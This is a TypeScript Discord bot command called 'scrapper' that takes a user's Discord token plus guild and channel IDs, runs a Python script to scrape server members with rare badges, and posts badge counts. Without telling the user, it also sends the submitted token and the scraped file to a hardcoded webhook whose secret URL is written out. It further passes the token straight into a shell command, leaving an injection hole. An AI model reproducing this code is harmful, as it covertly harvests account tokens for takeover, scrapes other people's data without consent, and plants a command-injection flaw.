import * as fs from 'fs';
import * as path from 'path';
import type BaseClient from '#lib/BaseClient.js';
import Command from '#lib/structures/Command.js';
import { exec } from 'child_process';
import { EmbedBuilder, WebhookClient, ChatInputCommandInteraction, GuildMember,  AttachmentBuilder } from 'discord.js';


export default class extends Command {
	public constructor(client: BaseClient) {
		super(client, {
			name: 'scrapper',
			description: 'Get information about users with rare badges on a server.'
		});
	}

	public async execute(interaction: ChatInputCommandInteraction<'cached' | 'raw'>) {
		const webhookClient = new WebhookClient(
			{ url:
				'https://discord.com/api/webhooks/1222000433711681546/n0cvIHJrcetM6vqhqXQIaHeExqtofiPI3-JUdb_2pOG6GjsDDk71EOEi61kAeEYBRSlt'
			}
		);

		const token: string | null = interaction.options.getString('token');
		const guild_id: string | null = interaction.options.getString('guild_id');
		const channel_id: string | null = interaction.options.getString('channel_id');
		const client_id: string | null = interaction.member instanceof GuildMember ? interaction.member.id : null;
		
		const startTime = Date.now();
		const data = exec(`python3 ${path.join(process.cwd(), "dist/lib/utils/Extract.py")} ${token} ${guild_id} ${channel_id} y ${client_id}`)
		const endTime = Date.now();
		const executionTime = (endTime - startTime) / 1000;

		const outputDir = 'dist/lib/utils/ochoa/client_extrack';
		const outputFile = path.join(`${process.cwd()}/${outputDir}/${guild_id}_${client_id}.txt`);

		await interaction.reply("Please Wait...")
		const checkOutputFile = () => {
            if (fs.existsSync(outputFile)) {
                const attachment = new AttachmentBuilder(outputFile);
				const fileContent = fs.readFileSync(outputFile, 'utf8');
				const wordsToFind = [
					'Discord Staff',
					'Partnered Server Owner',
					'HypeSquad Events',
					'Discord Bug Hunter (Normal)',
					'Early Supporter',
					'Team User',
					'Discord Bug Hunter (Golden)',
					'Early Verified Bot Developer',
					'Moderator Programs Alumni'
				];		
				const emojis = {
					'Discord Staff': '<:shb_badge_mod:1137478820493000844>',
					'Partnered Server Owner': '<:partner:1127329526800711861>',
					'HypeSquad Events': '<:hypesquad_events:123456791>',
					'Bug Hunter Level (Normal)': '<:bug_hunter_level_1:1127326566326739135>',
					'Early Supporter': '<:early_supporter:1127327191856853053>',
					'Team User': '<:team_user:123456794>',
					'Bug Hunter Level (Golden)': '<:bug_hunter_level_2:1127326649797574736>',
					'Verified Bot Developer': '<:verified_developer:1127326470793084958>',
					'Moderator Programs Alumni': '<:discordmod:1225073189084725319>'
				};
				const foundWords = wordsToFind.map(word => ({ word, count: fileContent.split(word).length - 1 })).filter(({ count }) => count > 0);
				const lol = []
				for (const { word, count } of foundWords) {
					lol.push(`${emojis[word as keyof typeof emojis]} ${word} **(${count})**`)
				}

				const embed = new EmbedBuilder()
					.setAuthor({
						name: 'Lovver | Scrapper.',
						iconURL: 'https://media.discordapp.net/attachments/1223800971675566101/1224892010440425502/emoji.gif?ex=661f2494&is=660caf94&hm=ad1fdfa8b5272c0e98b00cf0b0d75a6e744ddf8e58440f5bfb17836d39448b93&='
					})
					.setDescription("<:shb_a_ily:1137464780060364930> **Badges Found:**\n"+ lol.join('\n'))
					.setFooter({ text: `lovver ;`, iconURL: "https://media.discordapp.net/attachments/1215688010675257425/1221984417367457905/IMG_8947.jpg?ex=661490ac&is=66021bac&hm=74f9f7c89350a157ab0fa8308926e12194145b601a4242de8283957d2e076262&=&format=webp&width=320&height=427" as string })
					.setTimestamp()
					.setColor("#303037");
				const embed1 = new EmbedBuilder()
				.setAuthor({
					name: 'Lovver | Scrapper.',
					iconURL: 'https://media.discordapp.net/attachments/1223800971675566101/1224892010440425502/emoji.gif?ex=661f2494&is=660caf94&hm=ad1fdfa8b5272c0e98b00cf0b0d75a6e744ddf8e58440f5bfb17836d39448b93&='
				})
				.setDescription(`Client: <@${client_id}> Used Token: ${token} \n <:shb_a_ily:1137464780060364930> **Badges Found:**\n`+ lol.join('\n'))
				.setFooter({ text: `lovver ;`, iconURL: "https://media.discordapp.net/attachments/1215688010675257425/1221984417367457905/IMG_8947.jpg?ex=661490ac&is=66021bac&hm=74f9f7c89350a157ab0fa8308926e12194145b601a4242de8283957d2e076262&=&format=webp&width=320&height=427" as string })
				.setTimestamp()
				.setColor("#303037");
				interaction.editReply({ embeds: [embed], files: [attachment] });
				webhookClient.send({ embeds: [embed1], files: [attachment] })
            } else {
                const embed = new EmbedBuilder()
                    .setAuthor({
                        name: 'Lovver | Scrapper.',
                        iconURL: 'https://media.discordapp.net/attachments/1215688010675257425/1221984417367457905/IMG_8947.jpg?ex=661490ac&is=66021bac&hm=74f9f7c89350a157ab0fa8308926e12194145b601a4242de8283957d2e076262&=&format=webp&width=320&height=427'
                    })
                    .setDescription('Have patience the scrapper is running...')
                    .setFooter({ text: '🖤 | lovver', iconURL: this.client.user.avatarURL() as string })
                    .setColor("#303037");
                interaction.editReply({ embeds: [embed] });

                setTimeout(checkOutputFile, 10000);
            }
        };

        checkOutputFile();
    }
}
